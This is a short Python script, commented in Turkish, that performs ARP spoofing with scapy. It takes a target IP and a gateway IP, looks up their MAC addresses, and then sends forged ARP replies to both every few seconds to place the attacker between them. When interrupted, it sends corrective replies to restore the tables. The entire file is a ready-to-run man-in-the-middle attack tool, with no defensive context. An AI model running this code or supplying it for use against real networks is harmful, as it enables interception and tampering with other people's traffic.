import scapy.all as scapy
import time
import optparse
def mac_adresi_getir(ip):
    arp_istek_paket = scapy.ARP(pdst=ip)
    broadcast_paket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    birlesik_paket = broadcast_paket/arp_istek_paket
    cevap_liste = scapy.srp(birlesik_paket,timeout=1, verbose=False)[0] #1. elemanını almak için
    return cevap_liste[0][1].hwsrc #bu kullanım scapy sayesinde yapıldı

def arp_pozisyon(hedef_ip, pozisyonel_ip):

    hedef_mac = mac_adresi_getir(hedef_ip)

    arp_cevap = scapy.ARP(op=2, pdst=hedef_ip, hwdst=hedef_mac, psrc=pozisyonel_ip)
    scapy.send(arp_cevap, verbose=False)

def reset_yapma(karistirilmis_ip, gateway_ip):
    karistirilmis_mac = mac_adresi_getir(karistirilmis_ip)
    gateway_mac = mac_adresi_getir(gateway_ip)

    arp_cevap = scapy.ARP(op=2, pdst=karistirilmis_ip, hwdst=karistirilmis_mac, psrc=gateway_ip, hwsrc= gateway_mac)
    scapy.send(arp_cevap, verbose=False, count=6)

def kullanici_input_getir():
    parse_objesi = optparse.OptionParser()
    parse_objesi.add_option("-t","--target",dest="hedef_ip",help="Hedef ip giriniz.")
    parse_objesi.add_option("-g", "--gateway", dest="gateway_ip", help="Modem ip giriniz.")

    options = parse_objesi.parse_args()[0]

    if not options.hedef_ip:
        print("Hedef ip giriniz!")
    if not options.gateway_ip:
        print("Modem ip giriniz!")

    return options

kullanici_ipleri = kullanici_input_getir() #bu iki ipyi alır. kullanici ve modem ipleri
kullanici_hedef_ip = kullanici_ipleri.hedef_ip
gateway_hedef_ip = kullanici_ipleri.gateway_ip

paket_sayac = 0
try:
    while True:
        arp_pozisyon(kullanici_hedef_ip, gateway_hedef_ip)
        arp_pozisyon(gateway_hedef_ip, kullanici_hedef_ip)
        paket_sayac += 2
        print("\rPaket gönderiliyor: "+str(paket_sayac),end="") #bu aynı satırda kalmasını sağlar
        time.sleep(3)
except KeyboardInterrupt:
    print("\nÇıkış ve Reset Atıldı.")
    reset_yapma(kullanici_hedef_ip, gateway_hedef_ip)
    reset_yapma(gateway_hedef_ip,kullanici_hedef_ip)

